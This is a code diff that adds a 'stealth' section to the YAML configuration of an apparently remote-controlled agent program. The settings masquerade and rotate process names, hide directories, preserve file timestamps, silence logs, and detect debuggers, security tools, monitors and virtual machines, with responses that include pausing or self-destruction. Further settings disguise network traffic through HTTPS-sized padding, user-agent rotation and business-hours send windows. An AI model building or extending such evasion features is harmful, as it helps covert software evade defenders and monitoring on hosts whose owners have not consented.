@@ -326,6 +326,62 @@ fleet:
     # Must match fleet.agent.sign_requests — both must be true or both false.
     require_signature_verification: false
 
+# ── Stealth Mode ─────────────────────────────────────────────────────
+# Minimise the application's observable footprint on the host system.
+# Levels: off, low, medium, high, maximum (each includes the one below).
+stealth:
+  enabled: false
+  level: "off"                      # off | low | medium | high | maximum
+
+  process:
+    masquerade_name: "auto"         # "auto" picks per-platform, or specify custom
+    rotate_interval: 0              # seconds between name rotations (0 = disabled)
+    sanitize_threads: true
+    sanitize_argv: true
+
+  filesystem:
+    hidden_dirs: true
+    timestamp_preservation: true
+    minimal_footprint: false
+    custom_paths:                    # empty = auto-generate innocuous per-platform paths
+      pid_file: ""
+      data_dir: ""
+      log_dir: ""
+
+  logging:
+    silent_mode: false              # suppress all console output
+    suppress_file_log: false        # disable file logging
+    memory_ring_buffer: true        # keep last N entries in memory for remote debug
+    ring_buffer_size: 500
+    sanitize_messages: true         # scrub identifiable strings from log messages
+    suppress_startup_banner: true   # skip system-info dump at startup
+
+  resources:
+    cpu_jitter_factor: 0.3          # Gaussian jitter sigma as fraction of interval
+    cpu_ceiling: 15                 # max % CPU before throttling
+    io_spread: true                 # spread I/O writes over time
+    idle_sleep_interval: 30         # seconds to sleep when user is idle
+
+  detection:
+    enabled: true
+    scan_interval_min: 10           # randomised scan interval bounds (seconds)
+    scan_interval_max: 60
+    monitor_response: "throttle"    # ignore | throttle | pause | hibernate | self_destruct
+    debugger_response: "pause"
+    security_tool_response: "pause"
+    vm_detection: true
+    vm_response: "ignore"
+
+  network:
+    timing_jitter: 0.4              # Gaussian jitter factor for send intervals
+    packet_normalization: true      # pad/chunk payloads to HTTPS-typical sizes
+    user_agent_rotation: true       # rotate User-Agent on HTTP transport
+    send_window:
+      enabled: false
+      start_hour: 9                 # only send between these hours
+      end_hour: 18
+    max_bandwidth_bps: 0            # 0 = unlimited
+
 self_destruct:
   secure_wipe: false
   remove_program: false
